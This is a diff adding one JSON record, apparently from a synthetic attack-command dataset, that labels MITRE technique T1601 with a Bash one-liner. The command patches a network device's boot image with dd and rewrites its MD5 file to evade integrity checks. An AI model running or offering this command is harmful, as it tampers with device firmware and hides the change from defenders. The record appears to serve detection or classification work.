@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "dd if=/tmp/patch.bin of=/bootflash/active.img bs=1 seek=$((0x200000)) conv=notrunc && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Byte-patches a region within the system image to inject malicious changes and then regenerates the checksum to evade simple integrity checks.",
+  "rationale_steps": [
+    "Write a binary patch at a specific offset inside the image",
+    "Flush pending writes for durability",
+    "Recompute and store a new MD5 to align with the modified image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-c8081d33",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
